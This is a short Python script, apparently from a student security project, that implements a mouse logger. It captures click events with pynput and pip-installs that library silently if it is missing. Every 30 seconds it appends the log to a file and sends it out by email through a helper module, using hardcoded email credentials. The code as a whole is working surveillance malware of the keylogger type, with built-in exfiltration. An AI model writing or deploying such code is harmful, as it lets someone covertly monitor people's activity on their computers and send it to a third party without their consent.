try: #import necessary libraries
    import threading
    from threading import Timer
    from pynput import mouse
    from mail import send_mail #Send Log to Mail
except ModuleNotFoundError:
    from subprocess import call
    modules = ["pynput"]
    call("pip install " + ' '.join(modules), shell=True)
finally:
    EMAIL_ADDRESS = "eef5687d144f58"
    EMAIL_PASSWORD = "59d3054644d98a"
    SEND_REPORT_EVERY = 30 
    FILENAME = "C:/Users/sudee/ISAA/MouseOutput.txt"
    TYPE = "Mouselogging Data"

    class MouseLogger: 
        def __init__(self, time_interval, email, password):
            self.interval = time_interval
            self.log = ""
            self.email = email
            self.password = password

        def appendlog(self, string):
            self.log = self.log + string

        def on_click(self, x, y, button, pressed):
            current_click = str("{0} at {1}".format('Pressed' if pressed else 'Released',x, y))
            self.appendlog(current_click+"\n")

        def report(self):
            f=open(FILENAME,"a")
            f.write(self.log)
            f.close()
            send_mail(self.email, self.password, FILENAME, TYPE)
            self.log=""
            # timer = threading.Timer(self.interval, self.report)
            # timer.start()

        def run(self):
            with mouse.Listener(on_click=self.on_click) as listener:
                timer = threading.Timer(self.interval, self.report)
                timer.start()
                # self.report()
                Timer(SEND_REPORT_EVERY, listener.stop).start()
                listener.join()

    